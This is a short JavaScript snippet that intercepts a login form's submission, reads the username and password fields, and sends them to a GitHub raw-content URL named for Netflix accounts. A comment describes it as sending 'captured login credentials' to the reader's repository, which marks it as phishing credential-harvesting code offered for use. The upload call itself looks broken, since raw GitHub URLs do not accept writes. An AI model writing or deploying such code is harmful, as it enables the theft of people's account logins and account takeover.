const form = document.querySelector('form');
form.addEventListener('submit', (event) => {
  event.preventDefault();
  const username = document.querySelector('input[name="username"]').value;
  const password = document.querySelector('input[name="password"]').value;
  // Send the captured login credentials to your GitHub repository
  fetch('https://raw.githubusercontent.com/yahyachouei/hey/main/netflix_accounts.txt', {
    method: 'PUT',
    headers: { 'Content-Type': 'text/plain' },
    body: JSON.stringify({ username, password }),
  });
});
